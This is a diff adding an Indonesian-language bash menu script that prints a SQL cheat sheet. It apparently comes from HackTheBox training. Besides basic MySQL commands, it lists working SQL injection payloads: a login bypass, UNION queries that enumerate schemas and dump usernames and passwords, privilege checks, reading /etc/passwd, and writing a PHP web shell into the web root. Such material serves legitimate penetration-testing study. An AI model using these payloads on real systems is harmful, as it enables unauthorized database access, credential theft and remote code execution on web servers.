@@ -1,0 +1,86 @@
+#!/bin/bash
+# COLOR
+COff='\033[0m'       # Text Reset
+# Bold
+BBlack='\033[1;30m'       # Black
+BRed='\033[1;31m'         # Red
+BGreen='\033[1;32m'       # Green
+BYellow='\033[1;33m'      # Yellow
+BBlue='\033[1;34m'        # Blue
+BPurple='\033[1;35m'      # Purple
+BCyan='\033[1;36m'        # Cyan
+BWhite='\033[1;37m'       # White
+command(){
+echo -e "${BWhite}├──────────────────────────────────────────────────────────${BWhite}├─────────────────────────────────────────────────────────────────────${BWhite}|"
+echo -e "${BWhite}├                 ${BRed} **GENERAL**                             ${BWhite}|           				${BRed}**TABLES**             ${BWhite}          |"
+echo -e "${BWhite}├──────────────────────────────────────────────────────────${BWhite}├─────────────────────────────────────────────────────────────────────${BWhite}|"
+echo -e "${BWhite}├─${BYellow} mysql -u root -h docker.hackthebox.eu -P 3306 -p        ${BWhite}├─${BYellow} CREATE TABLE logins (id INT, ...)           			 ${BWhite}|"
+echo -e "${BWhite}├─${BYellow} SHOW DATABASES                                          ${BWhite}├─${BYellow} SHOW TABLES 							 ${BWhite}|"
+echo -e "${BWhite}├─${BYellow} USE users                                               ${BWhite}├─${BYellow} DESCRIBE logins				 			 ${BWhite}|"
+echo -e "${BWhite}├                                                          ├─${BYellow} INSERT INTO table_name VALUES (value_1,..) 			 ${BWhite}|"
+echo -e "${BWhite}├                                                          ├─${BYellow} INSERT INTO table_name(column2, ...) VALUES (column2_value, ..) 	 ${BWhite}|"
+echo -e "${BWhite}├                                                          ├─${BYellow} UPDATE table_name SET column1=newvalue1, ... WHERE <condition> 	 ${BWhite}|"
+echo -e "${BWhite}├──────────────────────────────────────────────────────────├─────────────────────────────────────────────────────────────────────${BWhite}|"
+echo -e "${BWhite}├                ${BRed} **COLUMNS**                              ${BWhite}|           				${BRed}**OUTPUT**             		 ${BWhite}|"
+echo -e "${BWhite}├──────────────────────────────────────────────────────────├─────────────────────────────────────────────────────────────────────${BWhite}|"
+echo -e "${BWhite}├─${BYellow} SELECT * FROM table_name                                ${BWhite}├─${BYellow} SELECT * FROM logins ORDER BY column_1			 	 ${BWhite}|"
+echo -e "${BWhite}├─${BYellow} SELECT column1, column2 FROM table_name                 ${BWhite}├─${BYellow} SELECT * FROM logins ORDER BY column_1 DESC			 ${BWhite}|"
+echo -e "${BWhite}├─${BYellow} DROP TABLE logins                                       ${BWhite}├─${BYellow} SELECT * FROM logins ORDER BY column_1 DESC, id ASC		 ${BWhite}|"
+echo -e "${BWhite}├─${BYellow} ALTER TABLE logins ADD newColumn INT                    ${BWhite}├─${BYellow} SELECT * FROM logins LIMIT 2					 ${BWhite}|"
+echo -e "${BWhite}├─${BYellow} ALTER TABLE logins RENAME COLUMN newColumn TO oldColumn ${BWhite}├─${BYellow} SELECT * FROM logins LIMIT 1, 2					 ${BWhite}|"
+echo -e "${BWhite}├─${BYellow} ALTER TABLE logins MODIFY oldColumn DATE                ${BWhite}├─${BYellow} SELECT * FROM table_name WHERE <condition>			 ${BWhite}|"
+echo -e "${BWhite}├─${BYellow} ALTER TABLE logins DROP oldColumn                       ${BWhite}├─${BYellow} SELECT * FROM logins WHERE username LIKE 'admin%'			 ${BWhite}|"
+echo -e "${BWhite}├──────────────────────────────────────────────────────────${BWhite}├─────────────────────────────────────────────────────────────────────${BWhite}|"
+}
+payloads(){
+echo -e "${BWhite}├──────────────────────────────────────────────────────────├─────────────────────────────────────────────────────────────────────${BWhite}|"
+echo -e "${BWhite}├                 ${BRed} **AUTH BYPASS**                         ${BWhite}|           				${BRed}**Union Injection**             ${BWhite} |"
+echo -e "${BWhite}├──────────────────────────────────────────────────────────├─────────────────────────────────────────────────────────────────────${BWhite}|"
+echo -e "${BWhite}├─${BYellow}  admin' or '1'='1        				   ${BWhite}├─${BYellow}  ' order by 1-- -           			 		 ${BWhite}|"
+echo -e "${BWhite}├─${BYellow}  admin')-- -                                            ${BWhite}├─${BYellow}  cn' UNION select 1,2,3-- - 					 ${BWhite}|"
+echo -e "${BWhite}├─${BYellow}                                               	   ${BWhite}├─${BYellow}  cn' UNION select 1,@@version,3,4-- -				 ${BWhite}|"
+echo -e "${BWhite}├                                                          ${BWhite}├─${BYellow}  UNION select username, 2, 3, 4 from passwords-- - 		 ${BWhite}|"
+echo -e "${BWhite}├────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────${BWhite}|"
+echo -e "${BWhite}├                ${BRed} **DB Enumeration**                										 ${BWhite}|"
+echo -e "${BWhite}├────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────${BWhite}|"
+echo -e "${BWhite}├─${BYellow}  SELECT @@version                              										 ${BWhite}|"
+echo -e "${BWhite}├─${BYellow}  SELECT SLEEP(5)                      											 ${BWhite}|"
+echo -e "${BWhite}├─${BYellow}  cn' UNION select 1,database(),2,3-- -         										 ${BWhite}|"
+echo -e "${BWhite}├─${BYellow}  cn' UNION select 1,schema_name,3,4 from INFORMATION_SCHEMA.SCHEMATA-- - 						 	 ${BWhite}|"
+echo -e "${BWhite}├─${BYellow}  cn' UNION select 1,TABLE_NAME,TABLE_SCHEMA,4 from INFORMATION_SCHEMA.TABLES where table_schema='dev'-- -	 	 	 ${BWhite}|"
+echo -e "${BWhite}├─${BYellow}  cn' UNION select 1,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA from INFORMATION_SCHEMA.COLUMNS where table_name='credentials'-- -    ${BWhite}|"
+echo -e "${BWhite}├─${BYellow}  cn' UNION select 1, username, password, 4 from dev.credentials-- -                     	 				 ${BWhite}|"
+echo -e "${BWhite}├────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────${BWhite}|"
+echo -e "${BWhite}├                ${BRed} **Privileges**                										 	     ${BWhite}|"
+echo -e "${BWhite}├──────────────────────────────────────────────────────────${BWhite}──────────────────────────────────────────────────────────────────────────────────${BWhite}|"
+echo -e "${BWhite}├─${BYellow}  cn' UNION SELECT 1, user(), 3, 4-- -                              								             ${BWhite}|"
+echo -e "${BWhite}├─${BYellow}  cn' UNION SELECT 1, super_priv, 3, 4 FROM mysql.user WHERE user='root'-- -                      				             ${BWhite}|"
+echo -e "${BWhite}├─${BYellow}  cn' UNION SELECT 1, grantee, privilege_type, is_grantable FROM information_schema.user_privileges WHERE user='root'-- -                  ${BWhite}|"
+echo -e "${BWhite}├─${BYellow}  cn' UNION SELECT 1, variable_name, variable_value, 4 FROM information_schema.global_variables where variable_name='secure_file_priv'-- - ${BWhite}|"
+echo -e "${BWhite}├────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────${BWhite}|"
+echo -e "${BWhite}├                ${BRed} **File Injection**                										 	     ${BWhite}|"
+echo -e "${BWhite}├──────────────────────────────────────────────────────────${BWhite}──────────────────────────────────────────────────────────────────────────────────${BWhite}|"
+echo -e "${BWhite}├─${BYellow}  cn' UNION SELECT 1, LOAD_FILE('/etc/passwd'), 3, 4-- -                              					 	     ${BWhite}|"
+echo -e "${BWhite}├─${BYellow}  select 'file written successfully!' into outfile '/var/www/html/proof.txt'                      				             ${BWhite}|"
+echo -e "${BWhite}├─${BYellow}  cn' union select '','<?php system($_REQUEST[0]); ?>', '', '' into outfile '/var/www/html/shell.php'-- -                  		 	     ${BWhite}|"
+echo -e "${BWhite}├────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────${BWhite}|"
+}
+nol=0
+satu=1
+dua=2
+while true
+do
+echo -e "${BRed}[0].Back${BGreen}"
+echo -e "${BGreen}[${BWhite}1${BGreen}].Command SQL"
+echo -e "${BGreen}[${BWhite}2${BGreen}].Payloads SQL"
+read -p "Pilih > " pilih
+if [ $satu == $pilih ]; then
+	command
+elif [ $dua == $pilih  ]; then
+	payloads
+elif [ $nol == $pilih ]; then
+	exit
+else
+	echo -e "${BRed}Tidak Ada"
+fi
+done
